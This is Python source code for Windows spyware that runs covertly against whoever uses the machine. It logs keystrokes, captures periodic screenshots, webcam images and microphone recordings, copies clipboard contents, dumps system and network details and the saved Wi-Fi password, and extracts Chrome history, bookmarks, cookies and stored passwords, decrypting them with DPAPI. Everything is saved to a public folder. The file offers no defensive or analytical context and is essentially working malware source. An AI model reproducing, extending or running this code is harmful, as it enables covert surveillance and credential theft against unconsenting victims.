import os
import logging
import threading
from pynput.keyboard import Listener
from PIL import ImageGrab
import cv2
import time
import sounddevice as sd
from scipy.io.wavfile import write as wav_write
import pyperclip
import subprocess
import sqlite3
import shutil
import os
import json

import win32crypt

# Define the paths
logs_directory = 'C:/Users/Public/Logs'
screenshots_directory = os.path.join(logs_directory, 'Screenshots')
keylog_file_path = os.path.join(logs_directory, 'keylog.txt')
pictures_directory = os.path.join(logs_directory, 'Pictures')
audio_directory = os.path.join(logs_directory, 'Audio')
clipboard_directory = os.path.join(logs_directory, 'Clipboard')
system_info_file_path = os.path.join(logs_directory, 'system_info.txt')
network_directory = os.path.join(logs_directory, 'Network')
wifi_info_file = os.path.join(network_directory, 'wifi_info.txt')
browsers_directory = os.path.join(logs_directory, 'Browsers')


chrome_data_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default")
chrome_data_path_1 = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network")
history_file_path = os.path.join(browsers_directory, 'Chrome_history.txt')
bookmarks_file_path = os.path.join(browsers_directory, 'Chrome_bookmarks.txt')

# Create the directories if they don't exist
os.makedirs(logs_directory, exist_ok=True)
os.makedirs(screenshots_directory, exist_ok=True)
os.makedirs(pictures_directory, exist_ok=True)
os.makedirs(audio_directory, exist_ok=True)
os.makedirs(clipboard_directory, exist_ok=True)
os.makedirs(network_directory, exist_ok=True)
os.makedirs(browsers_directory, exist_ok=True)

def on_press(key):
    logging.info(f"Key pressed: {key}")

logging.basicConfig(filename=keylog_file_path, level=logging.INFO, format='%(asctime)s: %(message)s')

def take_screenshot():
    while True:
        screenshot = ImageGrab.grab()
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        screenshot_path = os.path.join(screenshots_directory, f'screenshot_{timestamp}.png')
        screenshot.save(screenshot_path)
        time.sleep(5)  # Change the interval as needed

def take_pictures():
    cam = cv2.VideoCapture(0)
    while True:
        ret, frame = cam.read()
        if ret:
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            picture_path = os.path.join(pictures_directory, f'picture_{timestamp}.jpg')
            cv2.imwrite(picture_path, frame)
        time.sleep(5)  # Adjust the interval as needed
    cam.release()
    cv2.destroyAllWindows()

def record_audio():
    fs = 44100  # Sample rate
    duration = 10  # Recording duration in seconds
    while True:
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        audio_file_path = os.path.join(audio_directory, f'audio_{timestamp}.wav')
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()  # Wait for the recording to finish
        wav_write(audio_file_path, fs, recording)
        time.sleep(5)  # Adjust the interval as needed

def capture_clipboard_data():
    while True:
        clipboard_data = pyperclip.paste()
        if clipboard_data:
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            clipboard_file_path = os.path.join(clipboard_directory, f'Clipboard_{timestamp}.txt')
            with open(clipboard_file_path, 'w') as clipboard_file:
                clipboard_file.write(f"{clipboard_data}\n")
        time.sleep(5)  # Adjust the interval as needed

def gather_system_info():
    try:
        with open(system_info_file_path, 'w') as sys_info_file:
            subprocess.run(['systeminfo'], stdout=sys_info_file, stderr=subprocess.PIPE, text=True)
    except Exception as e:
        print(f"Error gathering system info: {str(e)}")

def gather_network_info():
    network_info_file_path = os.path.join(network_directory, 'network_info.txt')
    try:
        with open(network_info_file_path, 'w') as network_info_file:
            subprocess.run(['ipconfig', '/all'], stdout=network_info_file, stderr=subprocess.PIPE, text=True)
            subprocess.run(['arp', '-a'], stdout=network_info_file, stderr=subprocess.PIPE, text=True)
            subprocess.run(['getmac', '-V'], stdout=network_info_file, stderr=subprocess.PIPE, text=True)
            subprocess.run(['route', 'print'], stdout=network_info_file, stderr=subprocess.PIPE, text=True)
            subprocess.run(['netstat', '-ano'], stdout=network_info_file, stderr=subprocess.PIPE, text=True)
    except Exception as e:
        print(f"Error gathering network info: {str(e)}")

def gather_wifi_info():
    try:
        # Fetch the SSID of the currently connected network
        current_network_info = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces'], shell=True).decode('utf-8', errors='ignore')
        current_ssid_line = [line for line in current_network_info.split('\n') if "SSID" in line and "BSSID" not in line]
        
        if current_ssid_line:
            current_ssid = current_ssid_line[0].split(":")[1].strip()            
        else:
            raise Exception("No connected Wi-Fi network found.")

        # Fetch the password of the current network
        password_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', f'name="{current_ssid}"', 'key=clear'], shell=True).decode('utf-8', errors='ignore')

        # Write the information to the file
        with open(wifi_info_file, 'w') as file:
            file.write(f"Current Network SSID: {current_ssid}\nPassword Info:\n{password_info}")
    except subprocess.CalledProcessError as e:
        print(f"Command execution error: {e}")
    except Exception as e:
        print(f"Error gathering Wi-Fi info: {str(e)}")

gather_wifi_info()

def extract_chrome_history():
    history_db = os.path.join(chrome_data_path, 'History')
    temp_history_path = os.path.join(logs_directory, 'History_temp.db')
    shutil.copyfile(history_db, temp_history_path)

    connection = sqlite3.connect(temp_history_path)
    cursor = connection.cursor()
    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")

    with open(history_file_path, 'w', encoding='utf-8') as file:  # Set encoding to utf-8
        for url, title, last_visit_time in cursor.fetchall():
            file.write(f'{url} | {title} | {last_visit_time}\n')

    cursor.close()
    connection.close()
    os.remove(temp_history_path)

def extract_chrome_bookmarks():
    bookmarks_path = os.path.join(chrome_data_path, 'Bookmarks')
    
    # Check if the bookmarks file exists
    if not os.path.exists(bookmarks_path):
        print(f"No bookmarks file found at {bookmarks_path}")
        return

    try:
        with open(bookmarks_path, 'r', encoding='utf-8') as file:
            bookmarks_data = json.load(file)

        with open(bookmarks_file_path, 'w', encoding='utf-8') as file:
            def traverse_bookmarks(node):
                if 'type' in node and node['type'] == 'url':
                    file.write(f"{node['name']} | {node['url']}\n")
                elif 'children' in node:
                    for child in node['children']:
                        traverse_bookmarks(child)

            # Traverse root nodes
            for root_node in bookmarks_data['roots']:
                traverse_bookmarks(bookmarks_data['roots'][root_node])

    except Exception as e:
        print(f"Error extracting bookmarks: {str(e)}")

def extract_chrome_cookies():
    cookies_db_path = os.path.join(chrome_data_path_1, 'Cookies')
    temp_cookies_path = os.path.join(browsers_directory, 'Chrome_Cookies_temp.db')
    shutil.copyfile(cookies_db_path, temp_cookies_path)

    cookies_file_path = os.path.join(browsers_directory, 'Chrome_cookies.txt')

    connection = sqlite3.connect(temp_cookies_path)
    cursor = connection.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")

    with open(cookies_file_path, 'w', encoding='utf-8') as file:
        for host_key, name, encrypted_value in cursor.fetchall():
            decrypted_value = decrypt_chrome_data(encrypted_value)
            file.write(f'Host: {host_key}, Name: {name}, Value: {decrypted_value}\n')

    cursor.close()
    connection.close()
    os.remove(temp_cookies_path)

def extract_chrome_passwords():
    passwords_db_path = os.path.join(chrome_data_path, 'Login Data')
    temp_passwords_path = os.path.join(browsers_directory, 'Chrome_Passwords_temp.db')
    shutil.copyfile(passwords_db_path, temp_passwords_path)

    passwords_file_path = os.path.join(browsers_directory, 'Chrome_passwords.txt')

    connection = sqlite3.connect(temp_passwords_path)
    cursor = connection.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    with open(passwords_file_path, 'w', encoding='utf-8') as file:
        for origin_url, username, encrypted_password in cursor.fetchall():
            decrypted_password = decrypt_chrome_data(encrypted_password)
            file.write(f'URL: {origin_url}, Username: {username}, Password: {decrypted_password}\n')

    cursor.close()
    connection.close()
    os.remove(temp_passwords_path)

def decrypt_chrome_data(encrypted_value):
    # Use DPAPI to decrypt data
    try:
        decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
        return decrypted_value.decode('utf-8')
    except Exception as e:
        print(f"Decryption error: {e}")
        return ""

extract_chrome_history()
extract_chrome_bookmarks()
extract_chrome_cookies()
extract_chrome_passwords()

def run_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

try:
    threading.Thread(target=take_screenshot).start()
    threading.Thread(target=take_pictures).start()
    threading.Thread(target=record_audio).start()
    threading.Thread(target=capture_clipboard_data).start()
    
    gather_system_info()  # Gather system info at the start
    gather_network_info()  # Gather network info at the start
    gather_wifi_info()  # Gather Wi-Fi info at the start

    run_keylogger()
except Exception as e:
    print(f"An error occurred: {e}")
